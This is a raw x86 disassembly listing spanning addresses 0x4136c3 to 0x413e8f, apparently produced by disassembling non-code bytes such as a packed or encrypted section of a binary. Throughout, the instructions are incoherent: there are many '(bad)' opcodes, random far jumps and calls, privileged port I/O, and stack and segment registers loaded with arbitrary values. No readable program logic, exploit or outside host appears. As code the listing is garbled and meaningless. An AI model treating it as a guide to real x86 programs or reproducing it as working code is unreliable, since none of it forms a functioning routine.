  4136c3:	inc    esi
  4136c4:	sti    
  4136c5:	popa   
  4136c6:	ja     0x413739
  4136c8:	mov    WORD PTR [ebx+ebx*1],gs
  4136cb:	shl    DWORD PTR [edx-0x51],0x66
  4136cf:	jge    0x4136ed
  4136d1:	fbstp  TBYTE PTR [edx+0x5dcb2e8f]
  4136d7:	gs out 0x27,eax
  4136da:	int    0x8a
  4136dc:	call   0x1cf7:0x4c68c0cd
  4136e3:	dec    esi
  4136e4:	cld    
  4136e5:	mov    esp,DWORD PTR [edx-0x57]
  4136e8:	mov    edi,0xb2fdaf55
  4136ed:	xor    edx,esp
  4136ef:	cs mov ah,0x20
  4136f2:	pop    ecx
  4136f3:	pop    ss
  4136f4:	adc    DWORD PTR [ecx],esi
  4136f6:	xchg   BYTE PTR [ecx],bh
  4136f8:	ror    ah,0xb
  4136fb:	adc    cl,BYTE PTR [esi+0x8]
  4136fe:	in     al,0x93
  413700:	ret    
  413701:	jcxz   0x4136b9
  413704:	pop    ebp
  413705:	add    eax,0x1299acdb
  41370a:	xchg   edi,eax
  41370b:	and    eax,0x8045e591
  413710:	mov    dh,0xc6
  413712:	test   eax,0x88dca393
  413717:	int3   
  413718:	jmp    0x9df05b46
  41371d:	push   0x3ca59551
  413722:	mov    DWORD PTR [eax],eax
  413724:	inc    ebx
  413725:	inc    cl
  413727:	and    BYTE PTR [edx-0x28],0x76
  41372b:	enter  0x1464,0x22
  41372f:	aas    
  413730:	int    0x70
  413732:	jo     0x41375e
  413734:	adc    al,0x52
  413736:	adc    esp,DWORD PTR [edx-0x18]
  413739:	pop    ebp
  41373a:	test   DWORD PTR [esp+eax*4],ebp
  41373d:	fdivr  DWORD PTR [esi+0x3e]
  413740:	sbb    edx,eax
  413742:	dec    esp
  413743:	in     al,0xc6
  413745:	xchg   edx,eax
  413746:	out    0xea,eax
  413748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413749:	inc    eax
  41374a:	mov    bl,0x44
  41374c:	mov    ch,0xdb
  41374e:	pushf  
  41374f:	adc    ecx,DWORD PTR [edx]
  413751:	lahf   
  413752:	pop    es
  413753:	inc    esi
  413754:	pop    edi
  413755:	shl    BYTE PTR [eax+0x18ae61ba],cl
  41375b:	jmp    0x413737
  41375d:	cmp    BYTE PTR ds:[esp+ecx*8],0x29
  413762:	fsubr  st(4),st
  413764:	pop    esp
  413765:	or     esp,ebp
  413767:	or     edx,DWORD PTR [edx-0x28]
  41376a:	and    BYTE PTR [eax-0x52],dh
  41376d:	cli    
  41376e:	or     DWORD PTR [esi],0xc1c24a62
  413774:	pushf  
  413775:	nop
  413776:	outs   dx,DWORD PTR ds:[esi]
  413777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413778:	in     al,dx
  413779:	popa   
  41377a:	mov    bl,0xb6
  41377c:	xor    BYTE PTR [ebp-0x677964e1],cl
  413782:	push   0xe01aa648
  413787:	push   edx
  413788:	inc    esp
  413789:	xor    ah,BYTE PTR [edx]
  41378b:	push   es
  41378c:	div    BYTE PTR [eax-0x7c]
  41378f:	lods   al,BYTE PTR ds:[esi]
  413790:	mov    eax,ds:0xb2554ce2
  413795:	stc    
  413796:	fcmovnbe st,st(2)
  413798:	imul   esi,esp,0x38
  41379b:	xor    edx,DWORD PTR [edi-0x44]
  41379e:	push   ebp
  41379f:	lock or ch,BYTE PTR ds:[eax-0x38]
  4137a4:	aad    0x96
  4137a6:	pop    edx
  4137a7:	or     DWORD PTR [edx-0x11ce30db],ecx
  4137ad:	dec    ebp
  4137ae:	sahf   
  4137af:	shl    BYTE PTR [esi-0x771fd03f],0xcf
  4137b6:	xchg   edi,eax
  4137b7:	or     eax,ebx
  4137b9:	mov    ah,0xc8
  4137bb:	jb     0x41376c
  4137bd:	sbb    eax,DWORD PTR [ecx]
  4137bf:	sub    dl,BYTE PTR [ebp-0x645afb3b]
  4137c5:	pop    esi
  4137c6:	push   esp
  4137c7:	cld    
  4137c8:	sbb    DWORD PTR [edi],ecx
  4137ca:	xchg   ebp,eax
  4137cb:	inc    esi
  4137cc:	inc    eax
  4137cd:	call   0xcf3826fa
  4137d2:	mov    cl,0x60
  4137d4:	push   cs
  4137d5:	sahf   
  4137d6:	mov    esp,0x4ea8244a
  4137db:	leave  
  4137dc:	pusha  
  4137dd:	scas   eax,DWORD PTR es:[edi]
  4137de:	das    
  4137df:	cmp    eax,0xe213e185
  4137e4:	iret   
  4137e5:	sub    eax,0x967a455f
  4137ea:	lea    esp,[eax-0x57f95dad]
  4137f0:	addr16 into 
  4137f2:	cmp    eax,0xef73f7dd
  4137f7:	inc    ebp
  4137f8:	pushf  
  4137f9:	inc    edi
  4137fa:	into   
  4137fb:	ja     0x413815
  4137fd:	xchg   ebx,eax
  4137fe:	jnp    0x4137e4
  413800:	inc    eax
  413801:	(bad)  
  413803:	sahf   
  413804:	loope  0x41387b
  413806:	and    BYTE PTR [ebp+0x67],dl
  413809:	call   0xa7d3ab2b
  41380e:	xor    eax,0x1e94a276
  413813:	scas   eax,DWORD PTR es:[edi]
  413814:	fidivr WORD PTR [ebx+0x1]
  413817:	bound  ebp,QWORD PTR [edx+0x6c]
  41381a:	rcl    DWORD PTR [ecx],cl
  41381c:	and    esp,DWORD PTR [ebp-0x288327b2]
  413822:	mov    BYTE PTR [eax+0x9e877f8],ch
  413828:	push   ebp
  413829:	dec    DWORD PTR [ebp+ecx*1-0x1675b9e3]
  413830:	cmp    DWORD PTR [edi],0xffffffdc
  413833:	add    bh,BYTE PTR [ebx]
  413835:	mov    BYTE PTR [ecx],dl
  413837:	xchg   bl,ah
  413839:	push   cs
  41383a:	mov    bh,0x71
  41383c:	jno    0x413860
  41383e:	daa    
  41383f:	push   0xa
  413841:	add    DWORD PTR [esi],0xcf49d4a5
  413847:	jno    0x4138c4
  413849:	loopne 0x413847
  41384b:	pop    eax
  41384c:	out    0x4f,eax
  41384e:	aaa    
  41384f:	xchg   esp,eax
  413850:	mov    ecx,0x94d790b5
  413855:	sbb    cl,bl
  413857:	sahf   
  413858:	aas    
  413859:	jge    0x41383f
  41385b:	shl    BYTE PTR [ecx+eiz*4+0xd],1
  41385f:	sbb    eax,0xc1ed4266
  413864:	sbb    DWORD PTR [esi],ebx
  413866:	mov    ebp,0x25807eb7
  41386b:	hlt    
  41386c:	je     0x4138b4
  41386e:	rcl    DWORD PTR [ecx-0x64e207d5],cl
  413874:	jl     0x413833
  413876:	pop    ecx
  413877:	sub    dl,BYTE PTR [esi+edi*8-0xbb9e74d]
  41387e:	adc    ch,BYTE PTR [edx]
  413880:	jbe    0x4138c9
  413882:	adc    edi,eax
  413884:	or     al,0xa9
  413886:	rcr    esp,cl
  413888:	rcl    dl,1
  41388a:	rcl    BYTE PTR gs:[ecx+0x6d7733cd],cl
  413891:	push   eax
  413892:	in     al,dx
  413893:	lahf   
  413894:	pop    ss
  413895:	mov    dh,0x20
  413897:	dec    ecx
  413898:	jae    0x4138e5
  41389a:	outs   dx,DWORD PTR ds:[esi]
  41389b:	stos   DWORD PTR es:[edi],eax
  41389c:	xor    dh,BYTE PTR [esi-0x3defc3f2]
  4138a2:	dec    esp
  4138a3:	(bad)  
  4138a4:	or     al,0xd8
  4138a6:	je     0x413874
  4138a8:	popa   
  4138a9:	ret    0x1fad
  4138ac:	mov    WORD PTR [ecx+0xfb01e94],cs
  4138b2:	pop    ecx
  4138b3:	mov    al,BYTE PTR [esi+0x41]
  4138b6:	cdq    
  4138b7:	inc    esp
  4138b8:	bound  ebp,QWORD PTR [ebp+0x7434a782]
  4138be:	dec    ebx
  4138bf:	aaa    
  4138c0:	test   eax,0x9f341a56
  4138c5:	jle    0x41386f
  4138c7:	(bad)  
  4138c8:	leave  
  4138c9:	push   eax
  4138ca:	loop   0x413877
  4138cc:	xchg   ebx,eax
  4138cd:	jne    0x413859
  4138cf:	lahf   
  4138d0:	out    0xe4,eax
  4138d2:	iret   
  4138d3:	cmp    al,BYTE PTR [edi+0x50]
  4138d6:	and    ah,BYTE PTR [esi+eax*4-0xd]
  4138da:	jb     0x4138ef
  4138dc:	ret    
  4138dd:	mov    ecx,0x125f3902
  4138e2:	xor    DWORD PTR [esi+0x29],ecx
  4138e5:	and    DWORD PTR [edi],edx
  4138e7:	inc    esi
  4138e8:	cmp    BYTE PTR [edx+0x12],0x68
  4138ec:	ins    DWORD PTR es:[edi],dx
  4138ed:	inc    esp
  4138ee:	push   eax
  4138ef:	sub    DWORD PTR [ebp+edx*8+0x17565c06],0xa15e0286
  4138fa:	or     al,0x3
  4138fc:	xlat   BYTE PTR ds:[ebx]
  4138fd:	jle    0x4138c6
  4138ff:	jae    0x413897
  413901:	mov    edi,0x7c7c8b1b
  413906:	fimul  DWORD PTR [esi+0x22]
  413909:	aam    0x5c
  41390b:	test   BYTE PTR [edi+0x6a],ch
  41390e:	outs   dx,BYTE PTR ds:[esi]
  41390f:	xchg   ecx,eax
  413910:	xor    BYTE PTR [eax*4+0x3c0cb735],0xcd
  413918:	sub    al,0xe4
  41391a:	adc    edi,esp
  41391c:	mov    al,0x2c
  41391e:	repnz int 0xa9
  413921:	pop    edi
  413922:	rol    DWORD PTR [ebp+0x377c7798],cl
  413928:	(bad)
  41392c:	push   ecx
  41392d:	fsubr  DWORD PTR [edi+0x7c]
  413930:	or     BYTE PTR [esi],ch
  413932:	loop   0x413940
  413934:	icebp  
  413935:	loope  0x41392b
  413937:	js     0x41391e
  413939:	outs   dx,DWORD PTR ds:[esi]
  41393a:	push   ss
  41393b:	mov    edi,0x5dff3ad1
  413940:	xchg   BYTE PTR [edx-0x149be813],ah
  413946:	pushf  
  413947:	int    0x57
  413949:	loope  0x4138cb
  41394b:	mov    ecx,0xe0f0bc18
  413950:	nop
  413951:	sub    BYTE PTR [edx],cl
  413953:	mov    eax,0x11c841a4
  413958:	add    al,0x82
  41395a:	fadd   st(3),st
  41395c:	pushf  
  41395d:	sub    esp,DWORD PTR [esi-0x3e99920f]
  413963:	(bad)  
  413964:	arpl   WORD PTR [eax],ax
  413966:	jo     0x4139b5
  413968:	(bad)  
  413969:	xor    eax,0xb98ca914
  41396e:	(bad)  
  41396f:	or     al,0x5b
  413971:	repnz add bh,BYTE PTR [ecx+0x32cd1e21]
  413978:	call   0xa0523d4c
  41397d:	jl     0x413932
  41397f:	in     eax,dx
  413980:	pop    ebx
  413981:	scas   eax,DWORD PTR es:[edi]
  413982:	je     0x4139b2
  413984:	mov    edi,esp
  413986:	iret   
  413987:	scas   eax,DWORD PTR es:[edi]
  413988:	push   esi
  413989:	add    DWORD PTR [edx-0x695ee0dc],ebx
  41398f:	xchg   esi,eax
  413990:	cld    
  413991:	pop    esi
  413992:	dec    edx
  413993:	imul   ebx,DWORD PTR [esi+0xf],0xb95d354b
  41399a:	or     eax,0x5bf51d43
  41399f:	test   al,0x81
  4139a1:	test   BYTE PTR [esi-0x30],al
  4139a4:	or     al,0x13
  4139a6:	sahf   
  4139a7:	cs lock sbb ch,dl
  4139ab:	xlat   BYTE PTR ds:[ebx]
  4139ac:	ffree  st(4)
  4139ae:	push   ebx
  4139af:	sub    DWORD PTR [edi-0x6b3efbfe],0x9d0e0520
  4139b9:	push   ss
  4139ba:	shl    DWORD PTR [edi+0x7c4bdc24],1
  4139c0:	jb     0x4139f0
  4139c2:	(bad)  
  4139c3:	xchg   edx,eax
  4139c4:	xor    al,0x46
  4139c6:	icebp  
  4139c7:	mov    ah,0x78
  4139c9:	sbb    al,0xab
  4139cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139cc:	or     eax,0xfe795790
  4139d1:	out    0xca,al
  4139d3:	or     DWORD PTR [edi+ebx*2-0x6f],esp
  4139d7:	nop
  4139d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139d9:	xchg   ebx,eax
  4139da:	test   ah,bh
  4139dc:	sub    eax,0x9731316a
  4139e1:	xor    al,0xbb
  4139e3:	unpckhps xmm5,XMMWORD PTR [eax-0x1d79024]
  4139ea:	jp     0x41398f
  4139ec:	out    0xd4,eax
  4139ee:	adc    eax,0x5e1d106c
  4139f3:	inc    eax
  4139f4:	test   DWORD PTR [edx+0x708b19f],0xffb4c009
  4139fe:	(bad)  
  4139ff:	pop    esp
  413a00:	pop    ss
  413a01:	cmp    DWORD PTR [ebp+0x76],esi
  413a04:	add    al,0x93
  413a06:	inc    ebx
  413a07:	cs jno 0x4139b7
  413a0a:	stos   BYTE PTR es:[edi],al
  413a0b:	jbe    0x413a6f
  413a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a0e:	in     eax,0xf8
  413a10:	clc    
  413a11:	xor    bh,BYTE PTR [ebx+0x2c2a8240]
  413a17:	xor    edi,DWORD PTR [edx-0x5cbb33e8]
  413a1d:	xchg   DWORD PTR [ebp-0x13c980fa],ebx
  413a23:	iret   
  413a24:	aad    0xda
  413a26:	ja     0x413a17
  413a28:	jns    0x4139fb
  413a2a:	cdq    
  413a2b:	xor    eax,0xddfc9a22
  413a30:	mov    ebx,0xc5e8e494
  413a35:	adc    bh,BYTE PTR [esi+0x3351a060]
  413a3b:	aaa    
  413a3c:	inc    esi
  413a3d:	fisubr WORD PTR [esi+0x73]
  413a40:	aaa    
  413a41:	stos   BYTE PTR es:[edi],al
  413a42:	inc    ecx
  413a43:	jnp    0x413a76
  413a45:	jmp    0xaf4d:0xff81316f
  413a4c:	test   DWORD PTR [edx-0xc],edi
  413a4f:	xor    al,0x8d
  413a51:	cmp    eax,0x611e82cb
  413a56:	fucom  st(0)
  413a58:	cld    
  413a59:	jmp    0xc1c:0xef99608e
  413a60:	mov    al,ds:0x8b979943
  413a65:	or     eax,0xea701e6d
  413a6a:	enter  0x29aa,0x63
  413a6e:	adc    DWORD PTR [ebp-0x10784700],0xffffffa1
  413a75:	mov    ch,0xfc
  413a77:	sbb    al,0xd7
  413a79:	jo     0x413a15
  413a7b:	fsub   st,st(3)
  413a7d:	fwait
  413a7e:	jae    0x413aa7
  413a80:	pop    ebx
  413a81:	outs   dx,DWORD PTR ds:[esi]
  413a82:	pop    esi
  413a83:	sbb    ch,ah
  413a85:	jne    0x413a4e
  413a87:	cmp    DWORD PTR [ecx+0x365e012c],0x4a
  413a8e:	test   eax,0x7f381b8
  413a93:	sbb    eax,0x9063799a
  413a98:	shr    DWORD PTR [ebx-0x14c6ff5],1
  413a9e:	fisubr WORD PTR [ebp+0x1eb55c39]
  413aa4:	ret    0x2fc2
  413aa7:	das    
  413aa8:	or     dh,BYTE PTR [esi+0xa]
  413aab:	out    dx,eax
  413aac:	and    al,0xc1
  413aae:	nop
  413aaf:	sahf   
  413ab0:	mov    bl,BYTE PTR [ebx+0x5d523845]
  413ab6:	sbb    eax,0x585273f6
  413abb:	xchg   edi,eax
  413abc:	addr16 dec edi
  413abe:	test   DWORD PTR [ebp+edx*4-0x20],esi
  413ac2:	or     al,0x91
  413ac4:	xor    eax,DWORD PTR [edi]
  413ac6:	lea    ebp,[edi]
  413ac8:	mov    dh,0x37
  413aca:	dec    esp
  413acb:	iret   
  413acc:	push   esi
  413acd:	sbb    ch,ch
  413acf:	pusha  
  413ad0:	pop    ebx
  413ad1:	jae    0x413a89
  413ad3:	sbb    eax,0x1e58d25d
  413ad8:	mov    bh,0x20
  413ada:	sub    eax,0x7e188285
  413adf:	adc    al,0x44
  413ae1:	mov    edi,0xb49397db
  413ae6:	mov    al,0x5d
  413ae8:	ret    
  413ae9:	push   DWORD PTR [esi]
  413aeb:	adc    al,0x58
  413aed:	enter  0x9089,0x7c
  413af1:	and    eax,0xa9cf461f
  413af6:	push   ecx
  413af7:	pop    ecx
  413af8:	inc    edx
  413af9:	xchg   ebx,eax
  413afa:	adc    BYTE PTR [edx],bh
  413afc:	hlt    
  413afd:	leave  
  413afe:	imul   ecx,DWORD PTR [edx],0x967424e7
  413b04:	sbb    al,0xa1
  413b06:	dec    edx
  413b07:	cmp    esi,DWORD PTR [ebx]
  413b09:	test   al,0x55
  413b0b:	shr    DWORD PTR [edx+ebp*1],0xf8
  413b0f:	daa    
  413b10:	fmul   QWORD PTR [eax-0x6fbdaeea]
  413b16:	mov    edx,0xe1b14bd8
  413b1b:	call   0x976:0x67182917
  413b22:	mov    DWORD PTR [eax+edx*1-0x146dd1ac],edi
  413b29:	adc    ebx,esi
  413b2b:	xor    BYTE PTR [ebx-0x4b],bh
  413b2e:	pop    edx
  413b2f:	xor    edi,0xd5182ce1
  413b35:	and    BYTE PTR [edx],0x83
  413b38:	int    0xce
  413b3a:	aas    
  413b3b:	push   edx
  413b3c:	dec    esp
  413b3d:	test   eax,0x8cd2d5eb
  413b42:	retf   
  413b43:	hlt    
  413b44:	and    bh,ch
  413b46:	sub    eax,0xfcdac76f
  413b4b:	xchg   ebp,eax
  413b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b4d:	adc    eax,0xc3a41732
  413b52:	lock aam 0x6a
  413b55:	fimul  WORD PTR [edi]
  413b57:	imul   edi,DWORD PTR [esi],0xffffffd5
  413b5a:	ss cwde 
  413b5c:	mov    ebp,0x21a36a94
  413b61:	stos   BYTE PTR es:[edi],al
  413b62:	stos   DWORD PTR es:[edi],eax
  413b63:	mov    edx,0xaff8a8a5
  413b68:	pop    eax
  413b69:	test   eax,0x639b688f
  413b6e:	dec    ecx
  413b6f:	rcr    DWORD PTR [ebp+0x0],cl
  413b72:	cdq    
  413b73:	sbb    al,0x8b
  413b75:	mov    eax,ds:0xcdb4a07
  413b7a:	xchg   esp,eax
  413b7b:	fldcw  WORD PTR [eax-0x6a]
  413b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b7f:	cs je  0x413b8f
  413b82:	dec    ebp
  413b83:	int    0xea
  413b85:	pop    ss
  413b86:	jg     0x413ba4
  413b88:	xor    DWORD PTR [esi+0x3a8a09e6],edi
  413b8e:	in     eax,0xc6
  413b90:	(bad)  
  413b91:	call   FWORD PTR [esi+0x39c4a716]
  413b97:	or     DWORD PTR [esi+0xeceb556],edx
  413b9d:	inc    ecx
  413b9e:	adc    al,0x82
  413ba0:	jo     0x413b66
  413ba2:	dec    ebp
  413ba3:	cwde   
  413ba4:	mov    ecx,0x4ef16d15
  413ba9:	dec    edx
  413baa:	cdq    
  413bab:	mov    al,0x3c
  413bad:	arpl   WORD PTR [esi+0x21befee7],dx
  413bb3:	hlt    
  413bb4:	lods   eax,DWORD PTR ds:[esi]
  413bb5:	(bad)  
  413bb6:	adc    ebx,edx
  413bb8:	push   ecx
  413bb9:	(bad)  [ebx]
  413bbb:	jbe    0x413c35
  413bbd:	mov    ebp,0x331af6b8
  413bc2:	test   al,0x86
  413bc4:	in     al,0xe3
  413bc6:	repnz dec ebp
  413bc8:	mov    ecx,0xb97b0349
  413bcd:	lahf   
  413bce:	mov    bl,0x5a
  413bd0:	sbb    BYTE PTR [esi+0x2b449460],ch
  413bd6:	sbb    esi,edx
  413bd8:	sbb    ebp,DWORD PTR [eax-0x1220c65c]
  413bde:	mov    eax,0x54c27d6e
  413be3:	jp     0x413b8f
  413be5:	sub    esp,ebx
  413be7:	lock daa 
  413be9:	cmp    eax,0xeadca546
  413bee:	push   edi
  413bef:	stos   DWORD PTR es:[edi],eax
  413bf0:	retf   0xca0d
  413bf3:	dec    esp
  413bf4:	lock dec ebx
  413bf6:	icebp  
  413bf7:	imul   ebp,edx,0xb6175628
  413bfd:	xchg   esi,eax
  413bfe:	stc    
  413bff:	loopne 0x413bfb
  413c01:	repnz inc edi
  413c03:	mul    DWORD PTR [ebx+0x7ce6e1ed]
  413c09:	jne    0x413bc9
  413c0b:	dec    esp
  413c0c:	daa    
  413c0d:	mov    WORD PTR [edx-0x3998130],es
  413c13:	ret    0x263a
  413c16:	cmp    al,0xa4
  413c18:	call   0xcad978af
  413c1d:	xor    al,0x19
  413c1f:	and    al,0xbf
  413c21:	dec    bp
  413c23:	mov    ecx,0x504b7e8d
  413c28:	dec    eax
  413c29:	imul   edx,DWORD PTR [ebx],0xc
  413c2c:	ds fwait
  413c2e:	dec    DWORD PTR [ebp-0x76]
  413c31:	scas   al,BYTE PTR es:[edi]
  413c32:	push   ebx
  413c33:	mov    ch,0x63
  413c35:	scas   eax,DWORD PTR es:[edi]
  413c36:	or     DWORD PTR [edx-0x58919269],esp
  413c3c:	aas    
  413c3d:	out    dx,al
  413c3e:	sub    ah,ch
  413c40:	fucomip st,st(0)
  413c42:	lahf   
  413c43:	adc    al,0xfe
  413c45:	mov    ds:0x8c7c05cf,al
  413c4a:	and    al,0x87
  413c4c:	and    ebp,DWORD PTR [esi+eax*1]
  413c4f:	out    dx,eax
  413c50:	mov    ah,0xd9
  413c52:	sub    BYTE PTR [ebp-0x4e2147c0],dl
  413c58:	retf   0xdce
  413c5b:	pop    esi
  413c5c:	mov    eax,ds:0x4f320fc2
  413c61:	or     eax,0x529ff809
  413c66:	push   edx
  413c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c68:	rol    BYTE PTR [esi-0x19],1
  413c6b:	sub    edi,DWORD PTR [ecx]
  413c6d:	jp     0x413c0f
  413c6f:	and    DWORD PTR [ecx+ecx*1],ecx
  413c72:	shl    DWORD PTR [ebx+ebp*8],cl
  413c75:	daa    
  413c76:	lahf   
  413c77:	inc    ebx
  413c78:	leave  
  413c79:	imul   eax,DWORD PTR [edx],0xffffffa7
  413c7c:	shr    BYTE PTR [edi+eiz*8],1
  413c7f:	mov    esp,0xd5ce1d67
  413c84:	xor    al,0x48
  413c86:	mov    ah,0xd2
  413c88:	dec    esp
  413c89:	pop    es
  413c8a:	sub    eax,0x7af7c9f0
  413c8f:	rcl    DWORD PTR [ebp+0x89bcd44],0xd
  413c96:	in     al,dx
  413c97:	or     DWORD PTR [edi+0x668ac41],eax
  413c9d:	sbb    ebp,DWORD PTR [ecx+0x266efc36]
  413ca3:	or     BYTE PTR [eax],0xc6
  413ca6:	pop    esi
  413ca7:	inc    edi
  413ca8:	leave  
  413ca9:	aad    0x9b
  413cab:	repnz xchg ebx,eax
  413cad:	jmp    0x413cc2
  413caf:	sub    DWORD PTR [ebx+0x59],0x1b
  413cb3:	aam    0x74
  413cb5:	or     BYTE PTR [edi+0x62],dh
  413cb8:	loope  0x413d35
  413cba:	and    eax,0xa5a13ceb
  413cbf:	sub    al,0x89
  413cc1:	pop    ecx
  413cc2:	push   edx
  413cc3:	mov    ds:0x3abf806d,al
  413cc8:	cld    
  413cc9:	xor    al,0x44
  413ccb:	cld    
  413ccc:	in     eax,dx
  413ccd:	daa    
  413cce:	(bad)
  413cd2:	out    dx,al
  413cd3:	out    dx,al
  413cd4:	je     0x413cd6
  413cd6:	jns    0x413d50
  413cd8:	push   0xffffffb4
  413cda:	jnp    0x413d3f
  413cdc:	cmp    BYTE PTR [edx],0xb8
  413cdf:	ja     0x413ca8
  413ce1:	cmp    BYTE PTR [esi],cl
  413ce3:	(bad)  
  413ce4:	sbb    edi,ebp
  413ce6:	sub    ch,BYTE PTR [edx]
  413ce8:	pop    ds
  413ce9:	dec    esi
  413cea:	sar    esp,1
  413cec:	aas    
  413ced:	sbb    eax,0x8b9a03ef
  413cf2:	idiv   BYTE PTR [ebx-0x77078533]
  413cf8:	add    DWORD PTR [ebx+0x5b11d10e],eax
  413cfe:	inc    eax
  413cff:	and    al,0x14
  413d01:	mov    dl,0x78
  413d03:	repz add dl,BYTE PTR [esi]
  413d06:	lods   al,BYTE PTR ds:[esi]
  413d07:	xchg   ecx,eax
  413d08:	outs   dx,DWORD PTR ds:[esi]
  413d09:	popa   
  413d0a:	test   BYTE PTR [esi+0x616af32e],al
  413d10:	fistp  WORD PTR [ecx+0x35]
  413d13:	add    al,BYTE PTR [esi-0x78]
  413d16:	pop    ss
  413d17:	jbe    0x413d6c
  413d19:	adc    DWORD PTR [ebx+ebp*1],edx
  413d1c:	imul   edx,esp,0xffffffc1
  413d1f:	xchg   edx,eax
  413d20:	mov    esi,0xce18da7f
  413d25:	call   DWORD PTR [ebx]
  413d27:	bound  eax,QWORD PTR ds:0x7e25
  413d2c:	scas   eax,DWORD PTR es:[edi]
  413d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d2e:	loop   0x413d18
  413d30:	push   ecx
  413d31:	push   cs
  413d32:	arpl   WORD PTR [ecx+0x3c],dx
  413d35:	pusha  
  413d36:	push   sp
  413d38:	adc    eax,0xad163463
  413d3d:	sbb    ecx,esp
  413d3f:	sar    DWORD PTR [edx+0x45],0x9e
  413d43:	jecxz  0x413d68
  413d45:	jns    0x413d01
  413d47:	sub    eax,edx
  413d49:	sbb    BYTE PTR [edi-0x37],bh
  413d4c:	add    eax,0xf3c1cc24
  413d51:	ret    0xc2fa
  413d54:	inc    eax
  413d55:	mov    ch,0xc5
  413d57:	xchg   edi,eax
  413d58:	or     eax,0x3085dcf4
  413d5d:	adc    ebp,DWORD PTR [ebx]
  413d5f:	ret    0xb651
  413d62:	and    esi,DWORD PTR [edx+0x6294eaf1]
  413d68:	inc    esp
  413d69:	imul   edi,DWORD PTR [edi-0x3027e6c8],0x15
  413d70:	dec    edx
  413d71:	sahf   
  413d72:	sbb    BYTE PTR [edi],al
  413d74:	jbe    0x413d8a
  413d76:	xchg   ebp,eax
  413d77:	aad    0x3c
  413d79:	cld    
  413d7a:	fcmovnbe st,st(6)
  413d7c:	in     al,0x3d
  413d7e:	dec    dl
  413d80:	add    DWORD PTR [esi-0x42],ebx
  413d83:	mov    ecx,0x68ca0a23
  413d88:	xchg   DWORD PTR [edi],ecx
  413d8a:	cmc    
  413d8b:	fsubr  DWORD PTR [edx+eiz*4-0x59]
  413d8f:	xor    al,0x25
  413d91:	jae    0x413dc6
  413d93:	ds scas eax,DWORD PTR es:[edi]
  413d95:	sub    al,0x9a
  413d97:	dec    ecx
  413d98:	clc    
  413d99:	xchg   edx,eax
  413d9a:	mov    cl,0x5c
  413d9c:	ror    DWORD PTR [ecx+esi*8],1
  413d9f:	call   0x7fb0246c
  413da4:	es repnz sbb al,0x41
  413da8:	mov    ecx,0x958bf6fa
  413dad:	push   edx
  413dae:	(bad)  
  413db0:	xor    DWORD PTR [edx-0xa147ea8],eax
  413db6:	mov    bh,0x3c
  413db8:	dec    edx
  413db9:	push   edi
  413dba:	mov    ecx,0x33c1a654
  413dbf:	lods   eax,DWORD PTR ds:[esi]
  413dc0:	call   0xeed8:0x52695fb1
  413dc7:	adc    DWORD PTR [eax-0x6acd3c12],0x6a
  413dce:	lods   eax,DWORD PTR ds:[esi]
  413dcf:	mov    cl,0x3e
  413dd1:	xchg   ebx,eax
  413dd2:	xor    al,0x9c
  413dd4:	push   es
  413dd5:	or     DWORD PTR [eax+0xd],ebx
  413dd8:	scas   al,BYTE PTR es:[edi]
  413dd9:	popf   
  413dda:	rcr    BYTE PTR [ecx-0xe4f20fd],1
  413de0:	sub    al,0x51
  413de2:	ret    0x22ed
  413de5:	adc    esi,esp
  413de7:	cmp    al,0xc8
  413de9:	pop    esi
  413dea:	ins    DWORD PTR es:[edi],dx
  413deb:	inc    ebx
  413dec:	or     edx,edi
  413dee:	lods   al,BYTE PTR ds:[esi]
  413def:	arpl   WORD PTR [eax-0x6cf1a79f],dx
  413df5:	xchg   edx,eax
  413df6:	daa    
  413df7:	push   edi
  413df8:	cmp    DWORD PTR [edi+0x30d97e4e],0xffffff86
  413dff:	or     esp,DWORD PTR [edx]
  413e01:	ret    0x1d85
  413e04:	ss pop es
  413e06:	ret    
  413e07:	leave  
  413e08:	sbb    BYTE PTR [edi+0x11b31465],0x52
  413e0f:	and    DWORD PTR [edx],ebp
  413e11:	popf   
  413e12:	adc    esp,DWORD PTR [ecx+0x55]
  413e15:	lods   al,BYTE PTR ds:[esi]
  413e16:	popa   
  413e17:	adc    esi,DWORD PTR [edx+0x64dbb57a]
  413e1d:	fild   QWORD PTR [edi+0x62186100]
  413e23:	push   eax
  413e24:	or     BYTE PTR [ebp-0x4c428e36],bh
  413e2a:	ret    
  413e2b:	push   ecx
  413e2c:	push   0x8ac0edbd
  413e31:	mov    ecx,esp
  413e33:	sbb    bh,BYTE PTR [esi-0x55]
  413e36:	dec    esi
  413e37:	sub    BYTE PTR [esi],bh
  413e39:	push   eax
  413e3a:	lods   eax,DWORD PTR ds:[esi]
  413e3b:	sbb    BYTE PTR [eax-0x27],bh
  413e3e:	js     0x413e88
  413e40:	or     ah,BYTE PTR [edi+0x56807c8]
  413e46:	mov    ebx,0x1f3ac2b6
  413e4b:	mov    bh,ah
  413e4d:	mov    ds:0x3a79d8cc,eax
  413e52:	inc    edi
  413e53:	(bad)  
  413e54:	mov    esp,0x5a71c595
  413e59:	pop    ebp
  413e5a:	nop
  413e5b:	loop   0x413e46
  413e5d:	inc    edi
  413e5e:	push   cs
  413e5f:	leave  
  413e60:	loopne 0x413e23
  413e62:	mov    ch,0xd
  413e64:	scas   al,BYTE PTR es:[edi]
  413e65:	sar    al,0x3c
  413e68:	mov    al,ds:0x2ec10c3
  413e6d:	(bad)  
  413e6e:	push   edi
  413e6f:	pop    ds
  413e70:	and    al,0x8d
  413e72:	test   DWORD PTR [edx+eiz*4+0xb],esp
  413e76:	push   es
  413e77:	sub    ebp,DWORD PTR [edi+0x7e72b509]
  413e7d:	push   ebp
  413e7e:	cmp    DWORD PTR [edi],ecx
  413e80:	outs   dx,DWORD PTR ds:[esi]
  413e81:	adc    DWORD PTR [edi],esi
  413e83:	fbstp  TBYTE PTR [ebp+0x3a]
  413e86:	mov    BYTE PTR [ebp-0x30],bl
  413e89:	lds    esi,FWORD PTR [ecx]
  413e8b:	jne    0x413ecf
  413e8d:	out    dx,eax
  413e8e:	popf   
  413e8f:	nop
